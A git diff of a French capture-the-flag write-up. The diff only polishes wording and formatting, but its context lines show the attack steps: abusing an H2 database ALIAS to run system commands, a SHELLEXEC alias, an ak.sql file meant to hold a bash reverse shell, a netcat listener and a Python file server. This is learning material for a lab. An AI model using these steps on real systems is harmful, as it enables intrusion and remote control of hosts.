@@ -70,7 +70,7 @@ J'ai collé le message d'erreur dans la barre de recherche google : ```Unexpecte
 
 Après l'avoir lu, j'ai compris que l'erreur est liée à ``Jackson Polymorphic Deserialization expected START_ARRAY``.
 
-On a la possibilité d'exécuter des scripts SQL sur la base de données H2.
+On a la possibilité d'exécuter des scripts ``SQL`` sur la database H2.
 
 Ceci est expliqué sur l'article ci-dessous
 [article](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
@@ -78,7 +78,7 @@ Ceci est expliqué sur l'article ci-dessous
 ## 0x3 - Foothold
 
 
-Maintenant, vous devez créer un fichier ak.sql et ajouter un reverse shell en bash pour qu'il me rappelle. :
+Maintenant, vous devez créer un fichier ``ak.sql`` et ajouter un reverse shell en bash pour qu'il me rappelle. :
 
 ```sh
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -97,7 +97,7 @@ nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
-Start un serveur python où est située votre fichier ak.sql :
+Amorcer un serveur python où est située votre fichier ak.sql :
 
 
 ```sh
